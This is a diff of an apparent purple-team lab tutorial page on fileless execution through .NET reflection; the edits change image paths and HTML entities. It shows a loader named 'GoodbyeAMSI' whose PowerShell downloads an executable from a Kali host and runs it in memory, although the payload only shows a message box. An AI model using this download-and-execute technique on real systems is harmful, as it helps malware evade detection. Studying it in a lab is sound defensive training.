@@ -12,7 +12,6 @@ permalink: /solo-purple-teaming/introduction-to-reflection/
 <h1>Introduction to Reflection</h1>
 </section>
 <section class="spt-content">
-<p>Owner: Mike Sterrett</p>
 <h1
 id="bulb-using-reflection-in-net-and-powershell-for-fileless-execution">💡
 Using Reflection in .NET and PowerShell for Fileless Execution</h1>
@@ -42,12 +41,12 @@ id="small_blue_diamond-1-open-visual-studio-on-your-windows-11-reverse-engineeri
 <li><p>Create a new project:</p>
 <p><code>Console App (.NET Framework)</code></p></li>
 </ul>
-<p><img src="Introduction%20to%20Reflection/image.png"
+<p><img src="/_assets/introduction-to-reflection/image.png"
 alt="image.png" /></p>
 <ul>
 <li>Name it: <code>TestingReflection</code></li>
 </ul>
-<p><img src="Introduction%20to%20Reflection/image%201.png"
+<p><img src="/_assets/introduction-to-reflection/image%201.png"
 alt="image.png" /></p>
 <ul>
 <li>Click <strong>Create</strong></li>
@@ -56,7 +55,7 @@ alt="image.png" /></p>
 <h3 id="small_blue_diamond-2-clean-up-using-statements">🔹 2. Clean Up
 Using Statements</h3>
 <p>Remove any unnecessary <code>using</code> statements at the top.</p>
-<p><img src="Introduction%20to%20Reflection/image%202.png"
+<p><img src="/_assets/introduction-to-reflection/image%202.png"
 alt="image.png" /></p>
 <hr />
 <h3 id="small_blue_diamond-3-add-the-execute-function">🔹 3. Add the
@@ -68,14 +67,14 @@ class="sourceCode csharp"><code class="sourceCode cs"><span id="cb1-1"><a href="
 <span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">string</span><span class="op">[]</span> args <span class="op">=</span> <span class="op">{};</span></span>
 <span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">Main</span><span class="op">(</span>args<span class="op">);</span></span>
 <span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
-<p><img src="Introduction%20to%20Reflection/image%203.png"
+<p><img src="/_assets/introduction-to-reflection/image%203.png"
 alt="image.png" /></p>
 <p>Modify <code>Main</code> to just show a message box.</p>
 <hr />
 <h3 id="small_blue_diamond-4-add-windows-forms-reference">🔹 4. Add
 Windows Forms Reference</h3>
 <ul>
-<li>Right-click <strong>References</strong> &gt; <strong>Add
+<li>Right-click <strong>References</strong> > <strong>Add
 Reference</strong></li>
 <li>Under <strong>Assemblies</strong>, check:
 <ul>
@@ -83,14 +82,14 @@ Reference</strong></li>
 </ul></li>
 <li>Click OK</li>
 </ul>
-<p><img src="Introduction%20to%20Reflection/image%204.png"
+<p><img src="/_assets/introduction-to-reflection/image%204.png"
 alt="image.png" /></p>
 <ul>
 <li>Add this at the top:</li>
 </ul>
 <div class="sourceCode" id="cb2"><pre
 class="sourceCode csharp"><code class="sourceCode cs"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">using</span> System<span class="op">.</span><span class="fu">Windows</span><span class="op">.</span><span class="fu">Forms</span><span class="op">;</span></span></code></pre></div>
-<p><img src="Introduction%20to%20Reflection/image%205.png"
+<p><img src="/_assets/introduction-to-reflection/image%205.png"
 alt="image.png" /></p>
 <hr />
 <h3 id="small_blue_diamond-5-update-main-method">🔹 5. Update Main
@@ -98,9 +97,9 @@ Method</h3>
 <div class="sourceCode" id="cb3"><pre
 class="sourceCode csharp"><code class="sourceCode cs"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">static</span> <span class="dt">void</span> <span class="fu">Main</span><span class="op">(</span><span class="dt">string</span><span class="op">[]</span> args<span class="op">)</span></span>
 <span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
-<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>    MessageBox<span class="op">.</span><span class="fu">Show</span><span class="op">(</span><span class="st">&quot;You have been PWNd!&quot;</span><span class="op">,</span> <span class="st">&quot;Reflection Test&quot;</span><span class="op">);</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>    MessageBox<span class="op">.</span><span class="fu">Show</span><span class="op">(</span><span class="st">"You have been PWNd!"</span><span class="op">,</span> <span class="st">"Reflection Test"</span><span class="op">);</span></span>
 <span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
-<p><img src="Introduction%20to%20Reflection/image%206.png"
+<p><img src="/_assets/introduction-to-reflection/image%206.png"
 alt="image.png" /></p>
 <hr />
 <h3 id="small_blue_diamond-6-set-to-x64-and-release-mode">🔹 6. Set to
@@ -109,17 +108,17 @@ x64 and Release Mode</h3>
 <li>Open <strong>Configuration Manager</strong></li>
 <li>Create new platform: <code>x64</code></li>
 </ul>
-<p><img src="Introduction%20to%20Reflection/image%207.png"
+<p><img src="/_assets/introduction-to-reflection/image%207.png"
 alt="image.png" /></p>
 <ul>
 <li>Set build mode to <strong>Release</strong></li>
-<li>Build the solution: <code>Build &gt; Build Solution</code></li>
+<li>Build the solution: <code>Build > Build Solution</code></li>
 </ul>
-<p><img src="Introduction%20to%20Reflection/image%208.png"
+<p><img src="/_assets/introduction-to-reflection/image%208.png"
 alt="image.png" /></p>
 <ul>
 <li><p>Test by selecting <code>Start</code></p>
-<p><img src="Introduction%20to%20Reflection/image%209.png"
+<p><img src="/_assets/introduction-to-reflection/image%209.png"
 alt="image.png" /></p></li>
 </ul>
 <hr />
@@ -128,8 +127,8 @@ Part 2: Host Payload on Kali Linux</h2>
 <h3 id="small_blue_diamond-7-locate-the-compiled-binary">🔹 7. Locate
 the Compiled Binary</h3>
 <p>Path:</p>
-<pre><code>cd C:\Users\ReverseEngineer\source\repos\TestingReflection\TestingReflection\bin\x64\Release\
-</code></pre>
+cd C:\Users\ReverseEngineer\source\repos\TestingReflection\TestingReflection\bin\x64\Release\
+
 <h3 id="small_blue_diamond-8-transfer-binary-to-kali">🔹 8. Transfer
 Binary to Kali</h3>
 <p>From Windows CMD or PowerShell:</p>
@@ -139,7 +138,7 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="
 <li>Replace <code>10.0.3.2</code> with your Kali IP.</li>
 <li>Ensure Python HTTP server is serving <code>~/Downloads</code>:</li>
 </ul>
-<p><img src="Introduction%20to%20Reflection/image%2010.png"
+<p><img src="/_assets/introduction-to-reflection/image%2010.png"
 alt="image.png" /></p>
 <ul>
 <li>Start http server on Kali</li>
@@ -157,16 +156,16 @@ the PowerShell Loader</h3>
 the old payload</h3>
 <p>Add this code in its place:</p>
 <div class="sourceCode" id="cb7"><pre
-class="sourceCode csharp"><code class="sourceCode cs"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="dt">string</span> script <span class="op">=</span> @<span class="st">&quot;$bytes = (Invoke-WebRequest -Uri &quot;&quot;http://10.0.3.2:8000/TestingReflection.exe&quot;&quot;).Content</span></span>
+class="sourceCode csharp"><code class="sourceCode cs"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="dt">string</span> script <span class="op">=</span> @<span class="st">"$bytes = (Invoke-WebRequest -Uri ""http://10.0.3.2:8000/TestingReflection.exe"").Content</span></span>
 <span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>                $loadedAssembly <span class="op">=</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Reflection</span><span class="op">.</span><span class="fu">Assembly</span><span class="op">]::</span><span class="fu">Load</span><span class="op">(</span>$bytes<span class="op">)</span></span>
-<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>                                $typeName <span class="op">=</span> <span class="st">&quot;&quot;</span>TestingReflection<span class="op">.</span><span class="fu">Program</span><span class="st">&quot;&quot;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>                                $typeName <span class="op">=</span> <span class="st">""</span>TestingReflection<span class="op">.</span><span class="fu">Program</span><span class="st">""</span></span>
 <span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>                                $type <span class="op">=</span> $loadedAssembly<span class="op">.</span><span class="fu">GetType</span><span class="op">(</span>$typeName<span class="op">)</span></span>
 <span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>                                $instance <span class="op">=</span> <span class="op">[</span>Activator<span class="op">]::</span><span class="fu">CreateInstance</span><span class="op">(</span>$type<span class="op">)</span></span>
-<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>                                $methodName <span class="op">=</span> <span class="st">&quot;&quot;</span>Execute<span class="st">&quot;&quot;</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>                                $methodName <span class="op">=</span> <span class="st">""</span>Execute<span class="st">""</span></span>
 <span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>                                $method <span class="op">=</span> $type<span class="op">.</span><span class="fu">GetMethod</span><span class="op">(</span>$methodName<span class="op">)</span></span>
 <span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>                                $result <span class="op">=</span> $method<span class="op">.</span><span class="fu">Invoke</span><span class="op">(</span>$instance<span class="op">,</span> $null<span class="op">)</span></span>
-<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;;</span></span></code></pre></div>
-<p><img src="Introduction%20to%20Reflection/image%2011.png"
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="st">";</span></span></code></pre></div>
+<p><img src="/_assets/introduction-to-reflection/image%2011.png"
 alt="image.png" /></p>
 <hr />
 <h3 id="small_blue_diamond-10-build-the-loader">🔹 10. Build the
@@ -174,19 +173,19 @@ Loader</h3>
 <ul>
 <li>Set build to <strong>x64 Debug</strong>.</li>
 </ul>
-<p><img src="Introduction%20to%20Reflection/image%2012.png"
+<p><img src="/_assets/introduction-to-reflection/image%2012.png"
 alt="image.png" /></p>
 <ul>
-<li>Build &gt; Build Solution</li>
+<li>Build > Build Solution</li>
 </ul>
-<p><img src="Introduction%20to%20Reflection/image%2013.png"
+<p><img src="/_assets/introduction-to-reflection/image%2013.png"
 alt="image.png" /></p>
 <hr />
 <h3 id="small_blue_diamond-11-run-the-loader">🔹 11. Run the Loader</h3>
 <p>Navigate to the binary:</p>
-<pre><code>cd C:\Users\ReverseEngineer\source\repos\GoodbyeAMSI\GoodbyeAMSI\bin\x64\Debug\
-</code></pre>
-<p><img src="Introduction%20to%20Reflection/image%2014.png"
+cd C:\Users\ReverseEngineer\source\repos\GoodbyeAMSI\GoodbyeAMSI\bin\x64\Debug\
+
+<p><img src="/_assets/introduction-to-reflection/image%2014.png"
 alt="image.png" /></p>
 <p>Run the executable</p>
 <div class="sourceCode" id="cb9"><pre
@@ -195,7 +194,7 @@ class="sourceCode json"><code class="sourceCode json"><span id="cb9-1"><a href="
 <blockquote>
 <p>“You have been PWNd!”</p>
 </blockquote>
-<p><img src="Introduction%20to%20Reflection/image%2015.png"
+<p><img src="/_assets/introduction-to-reflection/image%2015.png"
 alt="image.png" /></p>
 <hr />
 <h2 id="test_tube-part-4-troubleshooting-optional">🧪 Part 4:
@@ -206,15 +205,15 @@ Troubleshooting (Optional)</h2>
 <h3 id="2-open-powershell">2. Open PowerShell</h3>
 <p>Run each line manually:</p>
 <div class="sourceCode" id="cb10"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="va">$bytes</span> <span class="op">=</span> <span class="op">(</span><span class="fu">Invoke-WebRequest</span> <span class="op">-</span>Uri <span class="st">&quot;http://10.0.3.2:8000/TestingReflection.exe&quot;</span><span class="op">).</span><span class="fu">Content</span></span>
-<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="va">$bytes</span><span class="op">.</span><span class="fu">Length</span>  <span class="co"># Confirm it&#39;s non-zero (e.g., 4096)</span></span>
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="va">$bytes</span> <span class="op">=</span> <span class="op">(</span><span class="fu">Invoke-WebRequest</span> <span class="op">-</span>Uri <span class="st">"http://10.0.3.2:8000/TestingReflection.exe"</span><span class="op">).</span><span class="fu">Content</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="va">$bytes</span><span class="op">.</span><span class="fu">Length</span>  <span class="co"># Confirm it's non-zero (e.g., 4096)</span></span>
 <span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="va">$loadedAssembly</span> <span class="op">=</span> <span class="op">[</span>System<span class="op">.</span><span class="fu">Reflection</span><span class="op">.</span><span class="fu">Assembly</span><span class="op">]::</span>Load<span class="op">(</span><span class="va">$bytes</span><span class="op">)</span></span>
 <span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="va">$loadedAssembly</span>  <span class="co"># Should return the assembly object</span></span>
 <span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="va">$type</span> <span class="op">=</span> <span class="va">$loadedAssembly</span><span class="op">.</span><span class="fu">GetType</span><span class="op">(</span><span class="st">&quot;TestingReflection.Program&quot;</span><span class="op">)</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a><span class="va">$type</span> <span class="op">=</span> <span class="va">$loadedAssembly</span><span class="op">.</span><span class="fu">GetType</span><span class="op">(</span><span class="st">"TestingReflection.Program"</span><span class="op">)</span></span>
 <span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="va">$instance</span> <span class="op">=</span> <span class="op">[</span>Activator<span class="op">]::</span>CreateInstance<span class="op">(</span><span class="va">$type</span><span class="op">)</span></span>
-<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="va">$method</span> <span class="op">=</span> <span class="va">$type</span><span class="op">.</span><span class="fu">GetMethod</span><span class="op">(</span><span class="st">&quot;Execute&quot;</span><span class="op">)</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="va">$method</span> <span class="op">=</span> <span class="va">$type</span><span class="op">.</span><span class="fu">GetMethod</span><span class="op">(</span><span class="st">"Execute"</span><span class="op">)</span></span>
 <span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="va">$method</span><span class="op">.</span><span class="fu">Invoke</span><span class="op">(</span><span class="va">$instance</span><span class="op">,</span> <span class="va">$null</span><span class="op">)</span></span></code></pre></div>
 <p>Check for:</p>
 <ul>
